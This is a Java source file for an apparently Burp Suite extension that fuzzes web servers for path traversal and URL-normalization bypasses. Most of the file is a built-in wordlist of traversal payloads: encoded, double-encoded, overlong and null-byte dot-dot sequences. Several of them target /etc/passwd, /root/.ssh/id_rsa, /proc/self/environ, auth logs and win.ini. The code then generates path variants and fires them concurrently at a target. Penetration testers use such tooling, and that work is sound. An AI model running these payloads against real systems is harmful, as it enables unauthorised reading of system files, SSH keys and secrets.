package pathbreaker;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.core.ByteArray;

import javax.swing.SwingUtilities;
import java.util.*;
import java.util.concurrent.*;

import java.util.function.Consumer;

public class FuzzEngine {

    private static final Set<Integer> INTERESTING = Set.of(200, 201, 206, 301, 302, 307, 308);

    // ── Builtin wordlist ported directly from exemplo.py ──
    public static final String BUILTIN_WORDLIST = "??../../\n" +
            "?..\n" +
            "?../..//\n" +
            "?/../\n" +
            "?/./../\n" +
            ".\n" +
            ".?.\n" +
            ".?./\n" +
            ".?./..//\n" +
            "..;?/../\n" +
            "..;/\n" +
            "..;/;/..;/\n" +
            "..;/;/../\n" +
            "..;/?../../\n" +
            "..;/..;/\n" +
            "..;/..;/?/\n" +
            "..;/..;/..;/\n" +
            "..;/..?/../\n" +
            "..;/../\n" +
            "..;/..%3f/../\n" +
            "..?\n" +
            "..??/../\n" +
            "..??//../\n" +
            "..?/../\n" +
            "..?/..//\n" +
            "......//////../\n" +
            ".....////../\n" +
            "...../////../\n" +
            "..../\n" +
            "..../?/\n" +
            "..../?/../\n" +
            "..../..../\n" +
            "....//\n" +
            "....//../\n" +
            "....///\n" +
            "....////../\n" +
            ".../.../\n" +
            ".../../\n" +
            "..././\n" +
            "../\n" +
            "../;?/\n" +
            "../;?/../\n" +
            "../;?#/\n" +
            "../;/../\n" +
            "../?../\n" +
            "../?/\n" +
            "../?/../\n" +
            "../../\n" +
            "../../../\n" +
            "../../../../\n" +
            "../../../../../\n" +
            "../../../../../../\n" +
            "../../../../../../../\n" +
            "../../../../../../../../\n" +
            "../../../../etc/passwd\n" +
            "../../../../proc/self/environ\n" +
            "../../../../proc/self/cmdline\n" +
            "../../../../proc/self/maps\n" +
            "../../../../proc/self/status\n" +
            "../../../../root/.ssh/id_rsa\n" +
            "../../../../var/log/auth.log\n" +
            "../../../../var/log/nginx/access.log\n" +
            "../../../../windows/win.ini\n" +
            "../../../etc/passwd\n" +
            "../../%00/\n" +
            "../../etc/passwd\n" +
            ".././../\n" +
            "../././../\n" +
            "..//\n" +
            "..//./../\n" +
            "..///\n" +
            "..///../\n" +
            "../%00/\n" +
            "../etc/passwd\n" +
            "..\\ \n" +
            "..\\..\\ \n" +
            "..\\..\\..\\ \n" +
            "..\\..\\..\\..\\ \n" +
            "..\\..\\..\\..\\windows\\win.ini\n" +
            "..\\..\\.\\etc\\passwd\n" +
            "..\\..\\etc\\passwd\n" +
            "..\\etc\\passwd\n" +
            "..%00/\n" +
            "..%09/\n" +
            "..%0a/\n" +
            "..%0d/\n" +
            "..%252f\n" +
            "..%252f;/../\n" +
            "..%252f?/../\n" +
            "..%252f..\n" +
            "..%252f..%252f\n" +
            "..%252f..%252f..%252f\n" +
            "..%252f..%252f..%252fproc/self/environ\n" +
            "..%252f..%252fetc/passwd\n" +
            "..%252f%252e%252e%252f\n" +
            "..%253f/../\n" +
            "..%255c?/..%255c\n" +
            "..%255c..%255cwindows\\win.ini\n" +
            "..%2f\n" +
            "..%2f;/../\n" +
            "..%2f;%2f../\n" +
            "..%2f??/../\n" +
            "..%2f?/\n" +
            "..%2f?/../\n" +
            "..%2f..\n" +
            "..%2f../\n" +
            "..%2f..%2f\n" +
            "..%2f..%2f..%2f\n" +
            "..%2f..%2f..%2f..%2f\n" +
            "..%2f..%2f..%2fproc/self/environ\n" +
            "..%2f..%2fetc/passwd\n" +
            "..%2f%2e%2e%2f\n" +
            "..%3f../\n" +
            "..%3f..%252f\n" +
            "..%3f..%2f\n" +
            "..%3f/../\n" +
            "..%5c\n" +
            "..%5c?/\n" +
            "..%5c?/..%5c\n" +
            "..%5c..\n" +
            "..%5c..%5c\n" +
            "..%5c..%5c..%5c\n" +
            "..%5c..%5cwindows\\win.ini\n" +
            "..%c0%af\n" +
            "..%c1%9c\n" +
            "..%ef%bc%8f\n" +
            "./\n" +
            "./.././../\n" +
            ".%2e/\n" +
            ".%2e/../\n" +
            ".%2e/.%2e/\n" +
            ".%2e/.%2e/.%2e/\n" +
            ".%2e%2f../\n" +
            "/;/\n" +
            "/.\n" +
            "/.;/\n" +
            "/.;/.;/../\n" +
            "/.;/../\n" +
            "/..?/\n" +
            "/..?/../\n" +
            "/..?//../\n" +
            "/.../../\n" +
            "/../\n" +
            "/../../\n" +
            "/../../../\n" +
            "/..//\n" +
            "/..\\\n" +
            "/..%252f\n" +
            "/..%252f../\n" +
            "/..%2f\n" +
            "/..%2f../\n" +
            "/..%2f..%2f\n" +
            "/./\n" +
            "/.%2e/\n" +
            "/.%2e/?/\n" +
            "/.%2e/?/../\n" +
            "/.%2e/.%2e/\n" +
            "/.%2e/.%2e/.%2e/\n" +
            "//../\n" +
            "//..//\n" +
            "/\\../\n" +
            "/%252e%252e?/\n" +
            "/%252e%252e/\n" +
            "/%252e%252e/?/../\n" +
            "/%252e%252e//%252e%252e/\n" +
            "/%252e%252e%252f\n" +
            "/%2e/\n" +
            "/%2e%2e?/\n" +
            "/%2e%2e/\n" +
            "/%2e%2e/?/../\n" +
            "/%2e%2e//%2e%2e/\n" +
            "/%2e%2e/%2e%2e/\n" +
            "/%2e%2e%2f\n" +
            "/%2f%2e%2e/\n" +
            "/%2f%2e%2e/%2f\n" +
            "\\../\n" +
            "\\..\\\n" +
            "\\\\../\n" +
            "%252e%252e/\n" +
            "%252e%252e/%252e%252e/\n" +
            "%252e%252e%252f\n" +
            "%252e%252e%252f%252e%252e%252f\n" +
            "%255c%255c..%255c\n" +
            "%2e./../\n" +
            "%2e%2e./\n" +
            "%2e%2e./../\n" +
            "%2e%2e/\n" +
            "%2e%2e/%2e%2e/\n" +
            "%2e%2e/%2e%2e/%2e%2e/\n" +
            "%2e%2e%255c\n" +
            "%2e%2e%2f\n" +
            "%2e%2e%2f%2e%2e%2f\n" +
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f\n" +
            "%2e%2e%5c\n" +
            "%c0%ae%c0%ae/\n" +
            "%c1%ae%c1%ae/\n" +
            "%ef%bc%8e%ef%bc%8e/";

    /**
     * Builds list of {label, rawPath} pairs from payloads + inject mode.
     * Ported from build_paths() in exemplo.py.
     */
    public static List<String[]> buildPaths(String basePath, List<String> payloads, String injectMode) {
        String[] segs = basePath.replaceAll("^/+|/+$", "").split("/", -1);
        List<String[]> results = new ArrayList<>();

        for (String rawPayload : payloads) {
            String p = rawPayload.strip();
            if (p.isEmpty() || p.startsWith("#"))
                continue;

            String path;
            String label;

            if ("tail".equals(injectMode)) {
                path = basePath.replaceAll("/+$", "") + "/" + p;
                label = "[tail] " + p;

            } else if ("prefix".equals(injectMode)) {
                path = "/" + p.replaceAll("^/+", "") + "/" + basePath.replaceAll("^/+", "");
                label = "[pfx] " + p;

            } else if (injectMode != null && injectMode.startsWith("mid:")) {
                int n = 1;
                try {
                    n = Integer.parseInt(injectMode.split(":")[1]);
                } catch (Exception ignored) {
                }
                n = Math.max(0, Math.min(n, segs.length - 1));
                List<String> newSegs = new ArrayList<>(Arrays.asList(segs).subList(0, n));
                newSegs.add(p.replaceAll("^/+|/+$", ""));
                newSegs.addAll(Arrays.asList(segs).subList(n, segs.length));
                path = "/" + String.join("/", newSegs) + "/";
                label = "[mid:" + n + "] " + p;

            } else if ("replace".equals(injectMode)) {
                path = "/" + p.replaceAll("^/+", "");
                label = "[rpl] " + p;

            } else {
                path = basePath.replaceAll("/+$", "") + "/" + p;
                label = "[?] " + p;
            }

            results.add(new String[] { label, path });
        }
        return results;
    }

    /**
     * Generates programmatic path variations. Ported from generate_programmatic()
     * in exemplo.py.
     */
    public static List<String[]> generateProgrammatic(String basePath) {
        String[] segs = basePath.replaceAll("^/+|/+$", "").split("/", -1);
        List<String[]> out = new ArrayList<>();

        String[][] slashTable = {
                { "%2F", "url-encode %2F" },
                { "%2f", "url-encode %2f" },
                { "%252F", "double-enc %252F" },
                { "%252f", "double-enc %252f" },
                { "//", "double-slash" },
                { "///", "triple-slash" },
                { "/./", "dot-seg" },
                { "/;/", "semi /;/" },
                { ";/", "semi-pfx" },
                { "%09/", "tab" },
                { "%0a/", "lf" },
                { "%0d/", "cr" },
                { "%00/", "null" },
                { "%c0%af", "overlong" },
                { "%e0%80%af", "overlong-3b" },
                { "%5C", "bslash %5C" },
                { "%5c", "bslash %5c" },
        };

        if (segs.length >= 2) {
            String rest = String.join("/", Arrays.copyOfRange(segs, 1, segs.length));
            for (String[] entry : slashTable) {
                String slash = entry[0];
                String lbl = entry[1];
                out.add(new String[] { "[1st] " + lbl, "/" + segs[0] + slash + rest + "/" });
            }
        }

        // query-sep family
        String[] qpList = {
                "..?/", "..?", "..??/", "..?/../", ".?./", ".?././", "/?../", "/?./",
                "..;/", "..;?/", "..;/../", "..;/..;/", "..;/..?/", "..%3f/../",
                "/..?/", "/.%2e/", "..%3f../", "..%3f..%2f"
        };
        for (String qp : qpList) {
            out.add(new String[] { "[qs-tail] " + qp, basePath.replaceAll("/+$", "") + "/" + qp });
            if (segs.length >= 2) {
                String rest = String.join("/", Arrays.copyOfRange(segs, 1, segs.length));
                out.add(new String[] { "[qs-1st] " + qp, "/" + segs[0] + "/" + qp + rest + "/" });
            }
        }

        // common prefix traversals
        String[] prefixes = { "/api", "/static", "/public", "/assets", "/v1", "/app", "/web", "/portal" };
        String bp = basePath.replaceAll("^/+", "");
        for (String pfx : prefixes) {
            out.add(new String[] { "trav " + pfx + "/..", pfx + "/../" + bp });
            out.add(new String[] { "trav " + pfx + "/%2e%2e", pfx + "/%2e%2e/" + bp });
            out.add(new String[] { "trav+qs " + pfx + "/..?/", pfx + "/..?/" + bp });
        }

        // suffix anomalies
        String[][] suffixes = {
                { ".", ".dot" },
                { "%20", "%20" },
                { ";", ";" },
                { "%00", "null" },
                { "?", "?" },
                { "?x=1", "?x=1" },
                { "/.", "/." },
                { "/..", "/.." },
                { "/..?/", "/..?/" },
                { "/..?/../", "/..?/../" },
        };
        for (String[] sfx : suffixes) {
            out.add(new String[] { "sfx " + sfx[1], basePath + sfx[0] });
        }

        return out;
    }

    /**
     * Sends a single raw HTTP request via Burp's HTTP stack (routes through proxy
     * history).
     */
    public static FuzzResult sendRequest(MontoyaApi api, HttpService service, String rawPath,
            String label, Map<String, String> extraHeaders, String method, String protocol,
            String headersBlock, String bodyBlock, boolean saveAll) {

        StringBuilder reqBuilder = new StringBuilder(method.length() + rawPath.length() + protocol.length()
                + headersBlock.length() + bodyBlock.length() + 256);
        reqBuilder.append(method).append(" ").append(rawPath).append(" ").append(protocol).append("\r\n");

        Set<String> addedHeadersLower = new HashSet<>();
        if (extraHeaders != null) {
            for (String key : extraHeaders.keySet()) {
                addedHeadersLower.add(key.toLowerCase());
            }
        }

        for (String line : headersBlock.split("\r\n")) {
            if (line.trim().isEmpty())
                continue;
            int colonIdx = line.indexOf(':');
            if (colonIdx > 0) {
                String hdrName = line.substring(0, colonIdx).trim().toLowerCase();
                if (addedHeadersLower.contains(hdrName)) {
                    continue;
                }
                if ("connection".equals(hdrName) && !addedHeadersLower.contains("connection")) {
                    reqBuilder.append("Connection: close\r\n");
                    continue;
                }
            }
            reqBuilder.append(line).append("\r\n");
        }

        if (!reqBuilder.toString().toLowerCase().contains("connection: close")
                && !addedHeadersLower.contains("connection")) {
            reqBuilder.append("Connection: close\r\n");
        }

        if (extraHeaders != null) {
            for (Map.Entry<String, String> entry : extraHeaders.entrySet()) {
                reqBuilder.append(entry.getKey()).append(": ").append(entry.getValue()).append("\r\n");
            }
        }

        reqBuilder.append("\r\n");
        reqBuilder.append(bodyBlock);

        String rawRequestStr = reqBuilder.toString();

        try {
            HttpRequest request = HttpRequest.httpRequest(
                    service,
                    ByteArray.byteArray(rawRequestStr.getBytes(java.nio.charset.StandardCharsets.UTF_8)));

            var response = api.http().sendRequest(request);

            if (response == null || response.response() == null) {
                return FuzzResult.error(label, rawPath, "no response");
            }

            var httpResponse = response.response();
            int statusCode = (int) httpResponse.statusCode();
            int bodyLength = httpResponse.body().length();

            boolean isInteresting = INTERESTING.contains(statusCode);
            burp.api.montoya.http.message.HttpRequestResponse detachedReqResp = null;

            if (saveAll || isInteresting || "[baseline]".equals(label)) {
                detachedReqResp = response.copyToTempFile();
            }

            return new FuzzResult(label, rawPath, statusCode, bodyLength, "", detachedReqResp);

        } catch (Exception e) {
            String msg = e.getMessage();
            if (msg == null)
                msg = e.getClass().getSimpleName();
            return FuzzResult.error(label, rawPath, msg);
        }
    }

    /**
     * Main fuzzing runner — builds full path list and fires all requests with a
     * thread pool.
     */
    public static ExecutorService runFuzz(MontoyaApi api, HttpService service, String baseRequestRaw,
            FuzzConfig config, Consumer<FuzzResult> onResult,
            Runnable onDone) {

        baseRequestRaw = baseRequestRaw.replaceAll("\r\n", "\n").replaceAll("\n", "\r\n");
        String method = "GET";
        String protocol = "HTTP/1.1";
        int firstLineEnd = baseRequestRaw.indexOf("\r\n");
        String basePath = "/";

        if (firstLineEnd > 0) {
            String firstLine = baseRequestRaw.substring(0, firstLineEnd);
            String[] parts = firstLine.split(" ");
            if (parts.length >= 3) {
                method = parts[0];
                basePath = parts[1];
                protocol = parts[2];
            } else if (parts.length >= 2) {
                method = parts[0];
                basePath = parts[1];
            }
        }

        int headersEnd = baseRequestRaw.indexOf("\r\n\r\n");
        String headersBlock = "";
        String bodyBlock = "";
        if (headersEnd > 0) {
            headersBlock = baseRequestRaw.substring(firstLineEnd + 2, headersEnd);
            bodyBlock = baseRequestRaw.substring(headersEnd + 4);
        } else if (firstLineEnd > 0) {
            headersBlock = baseRequestRaw.substring(firstLineEnd + 2);
        }

        final String fMethod = method;
        final String fProtocol = protocol;
        final String fHeadersBlock = headersBlock;
        final String fBodyBlock = bodyBlock;
        final boolean fSaveAll = !config.onlyHits;

        // Strip query string for path building
        int q = basePath.indexOf('?');
        if (q >= 0)
            basePath = basePath.substring(0, q);

        // Build wordlist (PathBreakerTab provides the final list via
        // config.customWordlist)
        List<String> wordlines = config.customWordlist;

        List<String[]> allPaths = new ArrayList<>();
        if ("Headers".equals(config.fuzzTarget)) {
            allPaths.add(new String[] { "[base]", basePath });
        } else {
            allPaths.addAll(buildPaths(basePath, wordlines, config.injectMode));
            if (config.useProgrammatic) {
                allPaths.addAll(generateProgrammatic(basePath));
            }
        }

        Set<Integer> filterCodes = config.parsedFilterCodes();

        ExecutorService executor = Executors.newFixedThreadPool(config.threads);

        List<Map<String, String>> headerPayloads = new ArrayList<>();
        if ("Paths".equals(config.fuzzTarget)) {
            headerPayloads.add(config.extraHeaders);
        } else {
            headerPayloads.add(Collections.emptyMap()); // baseline
            if (!config.extraHeaders.isEmpty()) {
                if (config.permuteHeaders) {
                    List<Map.Entry<String, String>> entries = new ArrayList<>(config.extraHeaders.entrySet());

                    // Individual headers
                    for (Map.Entry<String, String> e : entries) {
                        headerPayloads.add(Map.of(e.getKey(), e.getValue()));
                    }

                    // Incremental combinations (start from 2 up to N)
                    if (entries.size() > 1) {
                        Map<String, String> combo = new java.util.LinkedHashMap<>();
                        combo.put(entries.get(0).getKey(), entries.get(0).getValue());

                        for (int i = 1; i < entries.size(); i++) {
                            combo.put(entries.get(i).getKey(), entries.get(i).getValue());
                            headerPayloads.add(new java.util.LinkedHashMap<>(combo));
                        }
                    }
                } else {
                    headerPayloads.add(config.extraHeaders);
                }
            }
        }

        // Retain futures so we can cancel on stop
        List<Future<?>> futures = new ArrayList<>();

        final String finalBasePath = basePath;
        Thread orchestrator = new Thread(() -> {
            try {
                // Explicit Baseline task executed synchronously on background thread so it's always Row 0
                FuzzResult baseResult = sendRequest(api, service, finalBasePath, "[baseline]", Collections.emptyMap(),
                        fMethod, fProtocol, fHeadersBlock, fBodyBlock, true);
                if (!executor.isShutdown()) {
                    SwingUtilities.invokeLater(() -> onResult.accept(baseResult));
                }
            } catch (Exception e) {
                // suppress
            }

            for (String[] pair : allPaths) {
                if (executor.isShutdown() || Thread.currentThread().isInterrupted()) break;

                String pathLabel = pair[0];
                String rawPath = pair[1];

                for (Map<String, String> headers : headerPayloads) {
                    if (executor.isShutdown() || Thread.currentThread().isInterrupted()) break;

                    String headLabel = "";
                    if (!headers.isEmpty()) {
                        if (headers.size() == 1) {
                            headLabel = "[H: " + headers.keySet().iterator().next() + "]";
                        } else if (headers.size() == config.extraHeaders.size()) {
                            headLabel = "[H: All]";
                        } else {
                            headLabel = "[H: " + headers.size() + "]";
                        }
                    }

                    String finalLabel = pathLabel;
                    if (!headLabel.isEmpty()) {
                        finalLabel = (finalLabel.equals("[base]") ? "" : finalLabel + " ") + headLabel;
                    }
                    if (finalLabel.trim().isEmpty())
                        finalLabel = "[base]";

                    final String fLabel = finalLabel.trim();
                    final Map<String, String> fHeaders = headers;

                                
                    if ("[base]".equals(fLabel) && fHeaders.isEmpty()) {
                        continue; // Already processed as explicit [baseline]
                    }

                    Future<?> f = executor.submit(() -> {
                        if (Thread.currentThread().isInterrupted())
                            return;

                        FuzzResult result;
                        try {
                            result = sendRequest(api, service, rawPath, fLabel, fHeaders, fMethod, fProtocol, fHeadersBlock, fBodyBlock, fSaveAll);
                        } catch (Exception e) {
                            // If interrupted during sendRequest, just return
                            return;
                        }

                        if (Thread.currentThread().isInterrupted())
                            return;

                        // Apply filters
                        if (!filterCodes.isEmpty() && !filterCodes.contains(result.statusCode))
                            return;
                        if (config.onlyHits && !result.isInteresting)
                            return;
                        if (config.hideErrors && result.statusCode == null)
                            return;

                        SwingUtilities.invokeLater(() -> onResult.accept(result));
                    });
                    futures.add(f);
                }
            }

            // Shutdown watcher
            executor.shutdown();
            try {
                executor.awaitTermination(10, TimeUnit.MINUTES);
            } catch (InterruptedException ignored) {
                executor.shutdownNow();
            }
            SwingUtilities.invokeLater(onDone);
        });
        
        orchestrator.setDaemon(true);
        orchestrator.start();

        return executor;
    }
}
